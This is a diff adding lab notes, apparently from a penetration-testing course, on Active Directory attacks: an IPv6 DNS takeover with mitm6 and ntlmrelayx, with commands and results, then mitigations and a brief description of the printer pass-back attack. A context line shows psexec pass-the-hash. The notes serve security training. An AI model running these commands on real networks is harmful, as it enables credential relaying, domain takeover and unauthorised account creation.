@@ -257,3 +257,68 @@ psexec.py administrator@192.168.31.93 -hashes aad3b435b51404eeaad3b435b51404ee:7
 
 ---
 
+## IPv6 DNS Takeover
+
+### mitm6
+
+➡️ [mitm6](https://github.com/dirkjanm/mitm6) - exploits the default Windows config to take over the default DNS server by replying to DHCPv6 messages, providing the victim with a link-local `IPv6` address and setting the attacker's host as default DNS server
+
+- Setup the relay attack
+
+```bash
+sudo ntlmrelayx.py -6 -t ldaps://hydra-dc.MARVEL.local -wh fakewpad.MARVEL.local -l lootme
+```
+
+```bash
+# Run in another dedicated terminal
+sudo mitm6 -d MARVEL.local
+```
+
+- Reboot `THEPUNISHER` VM and check the `ntlmrelayx.py` output
+- Go to `~/tcm/peh/ad-attacks/lootme` directory
+  - the files contain data about domain users, computers, groups, policies, etc
+
+![](.gitbook/assets/2024-08-13_22-35-29_679.png)
+
+- Login to `THEPUNISHER` using the `MARVEL\administrator` and check the successful attack
+  - User `bkVKFfXduD` has been created
+
+![](.gitbook/assets/2024-08-13_22-39-43_680.png)
+
+### Mitigation
+
+**Mitigate IPv6 poisoning**:
+
+- Block DHCPv6 traffic and router advertisements in Windows Firewall using Group Policy
+- Use specific rules:
+  - (Inbound) Core Networking - `DHCPv6-In`
+  - (Inbound) Core Networking - `ICMPv6-In`
+  - (Outbound) Core Networking - `DHCPv6-Out`
+
+**Disable WPAD if not in use**:
+
+- Use Group Policy and disable `WinHttpAutoProxySvc` service
+
+**Mitigate LDAP/LDAPS relaying**:
+
+- Enable both LDAP signing and LDAP channel binding
+
+**Protect administrative accounts**:
+
+- Consider marking accounts as sensitive or adding them to the Protected Users group to prevent delegation and impersonation
+
+---
+
+## Pass-Back Attack
+
+Check this article for more information about the attack - [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
+
+- **MFPs** (Multi-Function Peripherals - **printers**, copiers) are often overlooked targets but can be exploited for serious security breaches
+- **Pass-Back Attack** - involves redirecting MFP's LDAP authentication to a malicious server to capture user credentials
+- Tools like [PRET](https://github.com/RUB-NDS/PRET) can be used to access MFP settings.
+- High-risk, low-effort - exploiting MFPs can yield sensitive data with minimal effort.
+
+![https://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet](.gitbook/assets/2024-08-13_23-25-28_682.png)
+
+---
+
